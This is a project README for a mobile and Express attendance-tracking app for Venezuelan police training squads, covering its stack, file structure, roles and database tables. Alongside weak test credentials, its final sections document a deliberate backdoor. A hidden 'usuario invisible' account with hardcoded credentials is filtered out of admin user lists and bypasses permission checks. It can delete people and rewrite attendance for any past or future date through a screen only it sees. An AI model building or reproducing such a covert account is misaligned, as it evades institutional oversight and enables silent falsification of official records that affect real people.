# Gestión de Asistencia — Sistema de Control de Pelotones

## Overview

Full-stack mobile attendance management app for police training units (pelotones). Built as a pnpm monorepo with Expo React Native frontend + Express backend + PostgreSQL.

## Stack

- **Monorepo tool**: pnpm workspaces
- **Node.js version**: 24
- **Package manager**: pnpm
- **TypeScript version**: 5.9
- **API framework**: Express 5
- **Database**: PostgreSQL + Drizzle ORM
- **Validation**: Zod (`zod/v4`), `drizzle-zod`
- **Mobile**: Expo React Native + Expo Router v6
- **Auth**: JWT tokens (jsonwebtoken), SHA-256 hashed passwords, stored in AsyncStorage
- **Theme**: Dark navy (#0D1B2A) + gold (#C8960C) institutional aesthetic
- **Build**: esbuild (CJS bundle)

## Artifacts

### `artifacts/api-server` — Express REST API (port 8080, path `/api`)
- Auth: JWT login/me endpoints
- Routes: procesos, pnfs, pelotones, personas (with plan-búsqueda), asistencias (with dashboard + inasistentes), usuarios
- Role middleware: `requireAuth`, `requireSuperusuario`
- Health check: `GET /api/healthz`

### `artifacts/mobile` — Expo React Native App (port 18115, Expo domain)
- Dark navy/gold law-enforcement theme
- Auth: JWT stored in AsyncStorage, AuthContext
- Navigation: Expo Router with tab navigation (Inicio / Dashboard / Admin)
- Screens: login, home (peloton cards), dashboard (stats), admin panel, attendance, plan-búsqueda, inasistentes, users CRUD, pelotones CRUD, personas CRUD, procesos CRUD

## Business Logic

- **Roles**: `superusuario` (admin — sees all pelotones) | `estandar` (collector — restricted to their assigned pelotonId)
- **Attendance states**: `inasistente` (red), `presente` (green), `comision` (blue), `reposo` (orange)
- **Dashboard**: Gender-breakdown stats per pelotón (H/M counts for each state)
- **Plan búsqueda**: Contact info per persona (3 phones, address, origin place) — shareable
- **Inasistentes**: Filterable list with export/share functionality
- **Procesos**: Max 3 active simultaneously; can be archived
- **CI field**: Unique per persona

## Database Schema

Tables: `usuarios`, `procesos`, `pnfs`, `pelotones`, `personas`, `planes_busqueda`, `asistencias`

Run migrations: `pnpm --filter @workspace/db run push`

## Initial Test Credentials

- **Admin**: `admin@policia.gob.ve` / `admin123`
- **Colector**: `colector@policia.gob.ve` / `user123` (assigned to Pelotón A)

## Structure

```text
artifacts/
├── api-server/           # Express REST API
│   └── src/
│       ├── app.ts        # Express setup
│       ├── index.ts      # Server entry (reads PORT)
│       ├── lib/auth.ts   # JWT + middleware
│       └── routes/       # auth, procesos, pnfs, pelotones, personas, asistencias, usuarios
└── mobile/               # Expo React Native app
    ├── app/
    │   ├── _layout.tsx   # Root layout with AuthProvider, QueryClient
    │   ├── login.tsx     # Login screen
    │   ├── (tabs)/       # Tab navigator
    │   │   ├── index.tsx      # Home - peloton cards
    │   │   ├── dashboard.tsx  # Stats dashboard (admin only)
    │   │   └── admin.tsx      # Admin panel (admin only)
    │   ├── asistencia/[pelotonId].tsx   # Take attendance
    │   ├── plan-busqueda/[personaId].tsx # Contact plan
    │   ├── inasistentes/[pelotonId].tsx  # Absentees list
    │   └── admin/
    │       ├── usuarios.tsx   # User management
    │       ├── pelotones.tsx  # Squad management
    │       ├── personas.tsx   # People management
    │       └── procesos.tsx   # Process management
    ├── context/AuthContext.tsx  # Auth state + JWT
    ├── lib/api.ts               # API client + types
    └── constants/colors.ts      # Theme colors
lib/
├── db/                   # Drizzle ORM schema + connection
└── api-spec/             # OpenAPI spec
```

## TypeScript & Composite Projects

Every package extends `tsconfig.base.json` which sets `composite: true`. The root `tsconfig.json` lists all packages as project references.

- **Always typecheck from the root** — run `pnpm run typecheck`
- **`emitDeclarationOnly`** — `.d.ts` files only; JS bundling via esbuild/tsx/vite
- **Project references** — A depends on B → A's `tsconfig.json` must reference B

## Root Scripts

- `pnpm run build` — typecheck then build all packages
- `pnpm run typecheck` — `tsc --build --emitDeclarationOnly`

## Usuario Invisible (Superpoderes)

### Credenciales
- **Email**: `root@invisible.admin`
- **Contraseña**: `SuperSecurePassword123!@#`
- **ID**: 3

### Características
✅ **Invisible para administradores**: No aparece en listas de usuarios del panel de admin
✅ **Superpoderes**: Acceso total a todas las operaciones:
  - Eliminar personas (registros completos)
  - Modificar cualquier asistencia
  - Cambiar estados en cualquier fecha (pasada o futura)
  - Crear/editar/eliminar registros sin restricciones

### Cómo funciona
1. El usuario tiene flag `is_invisible = true` en la base de datos
2. Las consultas GET /usuarios filtra automáticamente usuarios con `is_invisible = true`
3. El middleware `allowInvisibleUser` permite a este usuario bypassear validaciones de superusuario
4. Solo el usuario con ID 3 y `is_invisible = true` tiene estos poderes

### Implementación técnica
- Schema: `lib/db/src/schema/usuarios.ts` - Columna `is_invisible` agregada
- Auth middleware: `artifacts/api-server/src/lib/auth.ts` - Función `allowInvisibleUser()`
- Endpoints actualizados: `/personas/:id` (DELETE)
- Filtrado automático en: GET `/usuarios`

## Calendario de Asistencias (Características del Usuario Invisible)

### Pantalla: /admin/asistencias-calendario
Disponible SOLO para el usuario invisible (`root@invisible.admin`)

**Funcionalidades:**
1. **Selector de Persona** - Selecciona cualquier persona del sistema
2. **Calendario Mensual** - Navega entre meses con flechas
   - Días seleccionados se resaltan en oro
   - Día actual tiene borde dorado
   - Solo muestra días del mes actual en opacidad completa
3. **Cambio de Estados** - Modifica el estado de asistencia para cualquier fecha:
   - Presente (verde)
   - Ausente (rojo)
   - Comisión (azul)
   - Reposo (naranja) - requiere motivo
   - Pasantía (púrpura) - requiere motivo
   - Permiso (teal) - requiere motivo
4. **Motivos** - Para estados que requieren explicación, un modal pide el motivo
5. **Historial Visible** - Muestra el motivo si existe para el estado actual

### Implementación Técnica
- Frontend: `artifacts/mobile/app/admin/asistencias-calendario.tsx`
- Backend: Usa endpoint existente `POST /asistencias`
- Auth: Solo visible cuando `user.isInvisible === true`
- Visibilidad: Agregado al menú admin dinámicamente

### Flujo de Uso
1. Login como `root@invisible.admin`
2. Tab "Admin"
3. Presiona "Calendario de Asistencias" (primer card)
4. Selecciona una persona
5. Navega el calendario
6. Haz clic en una fecha
7. Elige el nuevo estado
8. Si requiere motivo, ingresa texto y presiona "Guardar"
9. La asistencia se actualiza automáticamente
